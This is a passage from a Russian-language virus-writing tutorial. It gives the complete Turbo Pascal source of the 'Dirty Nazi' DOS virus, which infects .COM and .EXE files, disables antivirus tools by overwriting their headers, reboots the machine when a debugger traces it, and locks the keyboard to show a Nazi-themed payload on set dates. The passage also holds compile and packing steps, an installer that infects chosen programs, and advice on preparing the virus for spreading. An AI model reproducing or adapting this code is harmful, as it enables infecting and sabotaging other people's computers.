приращение длины) & Length > 50000  (чтоб  не  получилась .COM Length,
например, 70000). Принцип заражения взят из вируса Inna  2.x,  выражаю
огромную благодарность автору. НЕ заражает  COMMAND.COM  (по  понятным
соображениям), не заражает файлы IBMBIO.COM, IBMDOS.COM (кстати,  вир-
мэйкеры, обратите внимание, если вы  отменяете  заражение  AIDSTEST  &
DRWEB, отменяйте плз эти два COMа тоже, работать корректней будет, ато
проверял я у себя Zipper, а потом нажал комбинацию из трех  пальцев  и
все -- пу-пу настало -- Novell бы и рад  загрузиться,  да  не  может).
Антивирусы не заражает, а заменяет сигнатуру 'MZ' на NOP, RET --  вер-
нуть управление системе. И восстановить всегда можно, и мне приятно...
При передаче управления носителю "лечит" его, а потом заражает по  но-
вой. Дабы не поражать файл дважды, пользуется  меткой  'NAZI',  причем
читает ее прямо из EXE-header'а (отчего б не юзануть Pklit'овский  (c)
раз уж от там есть?).

XREF-TO: Часть D. Пункт 4. Дополнительные возможности при использовании
         EXE-паковщиков.

        С   диска, на  котором  установлена  защита  от   записи,   не
запускается, а выдает фразу 'Abnormal program termination'  и  возвра-
щает управление в ДОС с ErrorLevel = 'Not enough memory'. Для тех, кто
любит в HEX-режиме лазить в чужие программы, содержит цитату  из "Гам-
лїта украинской редакции", помещенную в константе Message. Если  зара-
женная программа запускается в 4:00 или в 16:00, то  вирус  управления
ей не отдает, а выводит на экран в текстовом режиме  картинку,  делает
Print Screen и играет известную мелодию. Аналогичные действия произво-
дит при запуске 22 июня. Содержит хоть и примитивные, но зато уже  ан-
тидебагерные приемы: при попытке трассировки программой  DEBUG  с  оп-
цией t перегружает систему. НЕ СТОИТ из названия  программы  создавать
ошибочное представление об авторе -- никакого ущемленного самолюбия  у
меня нет, в детстве меня товарищи не обижали, и фашистских  наклоннос-
тей у меня тоже не замечается, и вирус этот, кстати, не несет  НИКАКОЙ
деструкции, а очень даже наоборот, старается  корректно  работать  при
всех условиях, разве что перед заражением не  выдает  на  экран  фразу
"D'you want this file to be infected (Y/N) ?".
     Вроде бы ничего не забыл, а если что и забыл -- сами разберетесь,
смотрите исходник.

P.S. Перед компиляцией в меню Options/Compiler все, что возможно, пос-
тавить на Off (вроде I/O Checking, Range Checking и т.д.), но оставить
On эмуляцию матсопроцессора.

{ VirusName    :  Dirty Nazi       }
{ Version      :  1.0              }
{ Target       :  *.EXE *.COM      }
{ Stealth      :  No               }
{ TSR          :  No               }
{ Attac Speed  :  Slow             }
{ Danger       :  0                }
{ Effects      :  Yes              }
{ Length       :  8000             }
{ Compiler     :  Turbo Pascal 5.5 }
{ BodyStatus   :  Packed           }
{ Packer       :  Pklite.exe       }

{               * Copyleft  (cl)  Dirty Nazi  1995 *                       }
                  { All suggestions are welcome! }

{ После компиляции запыколотить (Pklite -e Nazi.EXE),

XREF-TO: Часть D. Пункт 4. Как уменьшить размер откомпилированного вируса.

  а потом заменить в EXE строчку "Pklite" на "??NAZI",

XREF-TO: Часть D. Пункт 4. Дополнительные возможности при использовании
         EXE-паковщиков.

  а все остальное, включая "Not enough memory", забить мусором, только не
  трогайте "$", а то работать не будет. И следите за длиной! Если получится
  меньше 8000, то добейте в EXE мусором до 8000 или по курсу }

{$M 2048 , 0 , 0}

Uses Dos , Crt;

 Const
     Nazi      =  'NAZI';          { Метка вируса }
     VirLen    =  8000;            { Длина упакованого файла }
     RunError  =  #13#10'Abnormal program termination';
     C3        :  Array [1..2] of Byte = (144 , 195);  { А это для }
                                                       { антивирусников: }
                                                       { NOP }
                                                       { RET }
     Message   =  'Virus "Dirty Nazi". Нiякоi хуйнi не робим ми...';
              { Сообщение для тех, кто любит лазить в код }

 Var
    VirIdentifier     :  Array [1..4] of Char;
    VirBody           :  File;
    O1H , O3H  , Br   :  Pointer;
    CmdLine           :  String;
    OurName           :  PathStr;
    I                 :  Integer;
    Dir               :  PathStr;       { переменные для работы }
    Ext               :  ExtStr;
    Name              :  NameStr;
    Target            :  File;
    TargetFile        :  PathStr;
    VirBuf            :  Array [1..VirLen] of Char; { массивы для записи }
    TargetBuf         :  Array [1..VirLen] of Char; { тела вируса и инфици- }
    Attr              :  Word;                      { руемой программы }
    Time              :  LongInt;
    InfFiles          :  Byte;
    DirInfo           :  SearchRec;
    Regs              :  Registers;


 procedure CheckWriteProtect;       { проверка, не стоит ли на диске }
  begin                             { Write Protect }

   Assign(VirBody , '\'+#$FF);     { Invisible file ! }
   ReWrite(VirBody);
   Erase(VirBody);

   If IOResult <> 0 Then
     begin
         WriteLn(RunError);        { Если стоит, то пусть снимут, ато }
         Halt(8);                  { работать не будем }
     end;
 end;

 procedure CheckVirusBody;              { проверка на случай, если нас }
  begin                                 { упаковали каким-нибудь DIET'ом }

      Assign(VirBody , ParamStr(0));
      Reset(VirBody , 1);
      Seek(VirBody , 32);

      BlockRead(VirBody , VirIdentifier , 4);

      Close(VirBody);
                                      { Из тела запущенной программы }
      If VirIdentifier <> Nazi Then   { считываем метку вируса и, если }
       begin                          { таковой не найдено, halt'им }
           WriteLn(RunError);         { программу }
           Halt(8);        { ErrorLevel = 8 , Not Enough Memory! ;-) }
       end;
  end;      { Конец этой увлекательной процедуры }

{$F+}
  procedure ReBoot; Interrupt;
   begin                         { А это для того, чтобы нехорошие дяди }
    InLine($EA/                  { Лозинские не запускали Debug t }
           $00/
           $00/
           $FF/
           $FF);
   end;
{$F-}

{$F+}
  procedure BreakOff; Interrupt;
   begin
              { Invisible Magic Words! }
   end;
{$F-}

 procedure Information;
  begin

      If ParamStr(1)='/??' Then        { Если нам передали вот такой }
       begin                           { параметр, то рассказываем о себе }
          InLine($B4/
                 $01/                              { MOV AH, 01h }
                 $B5/       { Прячем курсор }
                 $20/                              { MOV CH, 20h }
                 $CD/
                 $10);                             { INT 10h }

          TextBackGround(0);
          ClrScr;

          WriteLn(#13#10);

          TextColor(LightGreen);

          WriteLn('  ╔═══════════════════════════════╗');
          WriteLn('  ║ Name             "Dirty Nazi" ║');
          WriteLn('  ║ Type             Virus        ║');
          WriteLn('  ║ Version          1.0          ║');
          WriteLn('  ║ Target           *.COM *.EXE  ║');
          WriteLn('  ║ Stealth          No           ║');
          WriteLn('  ║ TSR              No           ║');
          WriteLn('  ║ Attac speed      Slow         ║');
          WriteLn('  ║ Danger           0            ║');
          WriteLn('  ║ Effects          Yes          ║');
          WriteLn('  ║ Length           ' , VirLen , '         ║');
          WriteLn('  ║ Language         Turbo Pascal ║');
          WriteLn('  ╚═══════════════════════════════╝'#13#10#13#10);

          TextColor(14);
          TextBackGround(9);

          Write('▀▀▀▀▀');           { Украинский флаг }

          TextColor(15);
          TextBackGround(0);

          WriteLn('   Unregistered copy. Please register!');

          InLine($FA/            { CLI }        { System }
                 $F4);           { HLT }        { halted }

       end;
 end;         { end proc }

 procedure Init;                { Процедура инициализации переменных }
  begin                         { программы и проверки условий работы }

     If False Then Write(Message); { Засовываем в код константу Message }

     OurName:=ParamStr(0);     { Имя запущенной программы }

     GetIntVec($01 , O1H);                  { Подготавливаем систему }
     SetIntVec($01 , @ReBoot);              { к принятию вируса: }

     GetIntVec($03 , O3H);                  { Вешаем антитрассировщик }
     SetIntVec($03 , @ReBoot);              { на int 1h и int 3h }

     GetIntVec($1B , Br);                   { заменяем вектор ^Break }
     SetIntVec($1B , @BreakOff);
     SetCBreak(False);                      { и отключаем ^C }

     CheckWriteProtect;           { Проверяем, не на Read Only ли диске }
                                  { нас хотели запустить }
     CheckVirusBody;              { Проверяем, не споплюжили ли нам код }

     Information;                 { и не хотят ли Инфо получить }

     InfFiles:=0;
                                  { Инициализируем параметры }
     CmdLine:='';

     Assign(VirBody , ParamStr(0));
     Reset(VirBody , 1);

     BlockRead(VirBody , VirBuf , VirLen); { Считываем в буфер тело вируса }

     Close(VirBody);

     IF ParamCount <> 0 Then
        Begin
           For I:=1 To ParamCount Do
             CmdLine:=CmdLine + ' ' + ParamStr(I); { считываем параметры }
        End;                                       { в командной строке }

     Dir:='';

 end;   { end proc }

 procedure ExecOriginal;     { Процедура исполнения зараженной программы }
  begin

    FindFirst(ParamStr(0) , AnyFile , DirInfo);  { Получаем полную инфор- }
                                                 { мацию о файле в пере- }
                                                 { менную DirInfo }
    Assign(VirBody , ParamStr(0));

    Time:=DirInfo.Time;          { Запоминаем дату/время и атрибуты файла }
    Attr:=DirInfo.Attr;

    SetFAttr(VirBody , Archive);    { Устанавливаем аттрибут Archive }

    Reset(VirBody , 1);

    Seek(VirBody , DirInfo.Size - VirLen);

    BlockRead(VirBody , TargetBuf , VirLen);   { "Лечим" зараженный файл }

    Seek(VirBody , DirInfo.Size - VirLen);
    Truncate(VirBody);

    Seek(VirBody , 0);
    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);
    SetFAttr(VirBody , Attr);

    Close(VirBody);

    SetIntVec($01 , O1H);      { Восстанавливаем захваченные векторы }
    SetIntVec($03 , O3H);
    SetIntVec($1B , Br);

    SwapVectors;
      Exec(GetEnv('COMSPEC') , '/C ' + OurName + CmdLine);  { Исполняем }
    SwapVectors;

    Assign(VirBody , ParamStr(0));
                                                 { Заражаем в обратном }
    SetFAttr(VirBody , Archive);                 { порядке }

    Reset(VirBody , 1);

    BlockWrite(VirBody , VirBuf , VirLen);

    Seek(VirBody , DirInfo.Size - VirLen);

    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);         { восстанавливаем дату/время и }
    SetFAttr(VirBody , Attr);         { атрибуты файла }

    Close(VirBody);

 end;   { end proc }

 procedure FuckAntiVirus;       { а это -- для антивирусников }
  begin

    FindFirst(TargetFile , AnyFile , DirInfo); { Получаем инфо о файле в }
                                               { переменную Dirinfo }
    Assign(Target , TargetFile);

    Time:=DirInfo.Time;          { Запоминаем дату/время и }
    Attr:=DirInfo.Attr;          { атрибуты фала }

    SetFAttr(Target , Archive);   { Устанавливаем Archive }

    Reset(Target , 1);

    BlockWrite(Target , C3 , 2); { заменяем сигнатуру MZ на NOP , RET }

    SetFTime(Target , Time);    { восстанавливаем дату/время и }
    SetFAttr(Target , Attr);    { атрибуты файла }

    Close(Target);              { теперь антивирусник будет после вызова }
                                { сразу же красиво возвращать управление }
  end;    { end proc }          { системе }

 procedure FindTarget(Dir : PathStr);   { процедура поиска жертвы }

  Var
     Sr  :  SearchRec;

 function VirusPresent : Boolean;    { функция, проверяющая файл на }
  begin                              { зараженность }

     VirusPresent:=False;

     Assign(Target , TargetFile);
     Reset(Target , 1);

     Seek(Target , 32);
     BlockRead(Target , VirIdentifier , 4);

     If VirIdentifier = Nazi Then    { Если есть метка, то есть и вирус }
      VirusPresent:=True;

 end;  { end func }

 procedure InfectFile;   { процедура заражения файла }
  begin

   If (((Ext = '.COM') And ((Sr.Size < 20000) Or (Sr.Size > 50000))))
   Then Exit;
   If Sr.Name = 'COMMAND.COM' Then Exit;
   If Sr.Name = 'IBMBIO.COM' Then Exit; { проверяем файлы, которые заражать }
   If Sr.Name = 'IBMDOS.COM' Then Exit; { не надо }
   If ((Ext = '.EXE') And (Sr.Size < VirLen)) Then Exit;

   If Not VirusPresent Then      { если файл уже не заражен, }
    begin                        { то заразим его }

       Time:=Sr.Time;          { сохраняем дату/время и }
       Attr:=Sr.Attr;          { атрибуты файла }

       Assign(Target , TargetFile);
       SetFAttr(Target, Archive);   { Устанавливаем Archive }
       Reset(Target , 1);

       BlockRead(Target , TargetBuf , VirLen);

       Seek(Target , 0);
       BlockWrite(Target, VirBuf, VirLen);
                                                   { заражаем }
       Seek(Target , Sr.Size);
       BlockWrite(Target , TargetBuf , VirLen);

       SetFAttr(Target , Attr);     { восстанавливаем дату/время и }
       SetFTime(Target , Time);     { атрибуты файла }

       Close(Target);

       Inc(InfFiles);               { увеличиваем счетчик зараженных }
                                    { файлов }
    end;
 end;    { end proc }

 procedure CheckAnti;          { процедура проверки, не антивирусник ли }
  begin                        { нам попался }

    If (Name = 'AIDSTEST') Or
       (Name = 'TESTAIDS') Or
       (Name = 'DRWEB')    Or
       (Name = 'WEB')      Or
       (Name = 'ADINF')    Or
       (Name = 'ADINFEXT') Then FuckAntiVirus Else InfectFile;
  end;

  begin

      Dir:=Dir + '\';         { устанавливаем корневой каталог }

      FindFirst(Dir + '*.*', AnyFile , Sr);
       While DosError = 0 Do
         begin

           If Sr.Name='' Then Exit;

           TargetFile:=Dir + Sr.Name;   { имя и путь к найденному файлу }

 { Полу- } Ext:=Copy(Sr.Name , Length(Sr.Name) - 3 , Length(Sr.Name));
 { чаем }  Name:=Copy(Sr.Name , 1 , Length(Sr.Name) - Length(Ext));
 { имя и расширение найденного файла }
           If Ext = '.EXE' Then CheckAnti;  { Если .EXE или .COM -- тогда }
           If Ext = '.COM' Then CheckAnti;  { начинаем процесс заражения }

           If InfFiles > 1 Then Exit;       { если заразили 2 файла -- }
                                            { заканчиваем работу }
           FindNext(Sr);

         end;


      FindFirst(Dir + '*.*' , AnyFile , Sr);
       While DosError = 0 Do
        begin

          If (Sr.Name[1] <> '.') And (Sr.Attr = Directory) Then
             FindTarget(Dir + Sr.Name);

         FindNext(Sr);

       end;
  end;      { end proc }

{$F+}
 procedure Int09h;  Interrupt;
   begin
                { Пустая процедура для отключения клавиатуры }
   end;
{$F-}

 procedure Cross;   { Процедура размножения креста на экране }

  Var
     J , X , Y  :  Byte;

 procedure WriteCross;  { Процедура рисования креста ОДИН раз на экране }
  begin

        Write('█   █▀▀▀▀');
        If Y > 2 Then Inc(Y);
        GoToXY(X , Y + 1);
        Write('█   █');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('▀▀▀▀█▀▀▀█');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('    █   █');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('▀▀▀▀▀   ▀');

  end; { end proc }

  begin

    InLine($B4/
           $01/
           $B5/       { Hide cursor }
           $20/
           $CD/
           $10);

    HighVideo;

    TextBackGround(4);  { Красный фон }
    TextColor(0);       { черный цвет }
    ClrScr;

   X:=3;
   Y:=1;

   For I:=1 To 6 Do
    begin
      GoToXY(X , Y);
      For J:=1 To 5 Do          { заполняем экран крестами }
       begin
           WriteCross;
        Inc(Y);
        GoToXY(X , Y + 1);
       end;
      Y:=1;
      X:=X + 13;
    end;
    Intr($5 , Regs);           { и заодно выводим их на принтер }

  end;   { end proc }

 procedure Augustin;     { А это процедура исполнения известной мелодии }

   Var
      T      :  Array [1..12] of Integer;
      Kt     :  Array [1..48] of Integer;
      L , Q  :  Integer;

 begin

  Q := 200;

  T[1]:=131; T[2]:=139; T[3]:=147; T[4]:=156; T[5]:=165;
  T[6]:=175; T[7]:=185; T[8]:=196; T[9]:=208; T[10]:=220;
  T[11]:=223; T[12]:=247;

  For L:=1 To 12 Do Kt[L]:=T[L] Div 2;
  For L:=1 To 12 Do Kt[L + 12]:=T[L];
  For L:=1 To 12 Do Kt[L + 24]:=2 * T[L];
  For L:=1 To 12 Do Kt[L + 36]:=4 * T[L];

  Repeat

    Sound(Kt[32]); Delay(3 * Q); NoSound;
    Sound(Kt[34]); Delay(Q); NoSound;
    Sound(Kt[32]); Delay(q); NoSound;
    Sound(Kt[30]); Delay(q); NoSound;
    Sound(Kt[29]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[27]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[29]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[32]); Delay(3 * q); NoSound;
    Sound(Kt[34]); Delay(q); NoSound;
    Sound(Kt[32]); Delay(q); NoSound;
    Sound(Kt[30]); Delay(q); NoSound;
    Sound(Kt[29]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[27]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(q); NoSound;
    Delay(5 * q);

  Until False;

 end;      { end proc }

 procedure CheckDateAndTime;  { процедура проверки даты/времени }

  Var
    H , M , S , Ms : Word;         { Работа по аналогии с песней }
                                   { "22 июня ровно в 4 часа }
  begin                            {  ^^ ^^^^ ^^^^^   ^      }
                                   { Киев бомбили, нам объявили }
   GetTime(H , M , S , Ms);        { Что началася война" }

   If (((H = 4) And (M = 0)) Or ((H = 16) And (M = 0))) Then
      begin
         SetIntVec($09 , @Int09h);  { Если ровно 4:00 или 16:00 }
         Cross;                     { то рисуем кресты и играем }
         Augustin;                  { мелодию }
      end;

   GetDate(H , M , S , Ms);

   If ((M = 6) And (S = 22)) Then     { Если 22 июня, то }
      begin

         InLine($B4/
                $01/
                $B5/              { hide cursor }
                $20/
                $CD/
                $10);

         SetIntVec($09 , @Int09h);  { hook int 09h }

         TextColor(15);
         TextBackGround(0);
         ClrScr;


         WriteLn(#13#10);
         WriteLn(' ╔══════════════════════════════════╗');
         WriteLn(' ║ Dirty Nazi Virus. Nazi not dead! ║');
         WriteLn(' ║ Hi, Dummies!  Glad to  infect u! ║'); { выводим }
         WriteLn(' ║ [22/06]. Today is my holiday & I ║'); { информацию }
         WriteLn(' ║ want u to have a rest.  Relax, I ║'); { о вирусе }
         WriteLn(' ║ will  not  destroy  your  data!  ║');
         WriteLn(' ╠══════════════════════════════════╣');
         WriteLn(' ║        Type /?? for help         ║');
         WriteLn(' ╚══════════════════════════════════╝');

         Delay(20000);                          { ждем, пока прочтут }

         Cross;                         { кресты и мелодия }
         Augustin;

      end;

  end;  { end proc }


 begin  { * MAIN * }

     Init;                    { Инициализируемся }

     FindTarget(Dir);         { Ищем жертвы и заражаем их }

     CheckDateAndTime;        { Не пора ли нам показать себя ? }

     ExecOriginal;            { Исполняем зараженную программу }

 end.   { * ВОТ И ВСЕ, ВОТ И НАЧАЛСЯ ЛЕТОВ... * }

P.S. Да, кстати, откомпилированный вирус лучше не запускать напрямую,
а заразить какую-то программу, используя инсталлятор, описанный  ниже.

XREF-TO: Часть E. Пункт 2. Подготовка вируса к распространению.

Пользоваться инсталлятором следующим образом:

   Install.Exe Имя_Откомпилированного_Вируса.EXE Имя_Любой_Программы
                     ( Не забывайте о размерах ! )

                                                       (cl) Dirty Nazi
Program Install;
Uses Dos;
                                 { Пардон за отсутствие комментариев, но, }
                                 { по-моему, тут и комментировать нечего }
 Const
     VirLen  =  8000;

 Var
   DirInfo  :  SearchRec;
   BufFrom  :  Array [1..VirLen] of Char;
   BufTo    :  Array [1..VirLen] of Char;
   FromF    :  File;
   ToF      :  File;

 begin  { * MAIN * }

  If ParamCount <> 2 Then
    begin
       WriteLn(#13#10'- Required parameters missing'#13#10);
       Halt;
    end;

  FindFirst(ParamStr(1) , AnyFile , DirInfo);
   If DosError <> 0 Then
     begin
        WriteLn(#13#10'File "' , ParamStr(1) , '" not found!'#13#10);
        Halt;
     end;

  Assign(FromF , ParamStr(1));
  Reset(FromF , 1);

  FindFirst(ParamStr(2) , Archive , DirInfo);
   If DosError <> 0 Then
     begin
       WriteLn(#13#10'File "' , ParamStr(2) , '" not found or not Archive');
       WriteLn('Set Archive attribute then try again'#13#10);
        Halt;
     end;

  Assign(ToF , ParamStr(2));
  Reset(ToF , 1);

  Seek(FromF , 0);
  Seek(ToF , 0);

  BlockRead(FromF , BufFrom , VirLen);
  BlockRead(ToF , BufTo , VirLen);

  Seek(ToF , 0);
  BlockWrite(ToF , BufFrom , VirLen);

  Seek(ToF , DirInfo.Size);
  BlockWrite(ToF , BufTo , VirLen);

  Close(FromF);
  Close(ToF);

  WriteLn(#13#10'Infection completed. Copyleft (cl) Dirty Nazi 1995');
  WriteLn('"' , ParamStr(2) , '" now infected by Dirty Nazi Virus v.1.0');

 end.  { * WAR IS OVER (IF U WANT IT) * }

        На этом Часть 2, как это ни прискорбно, завершается. Вперед,
к резидентности! ;)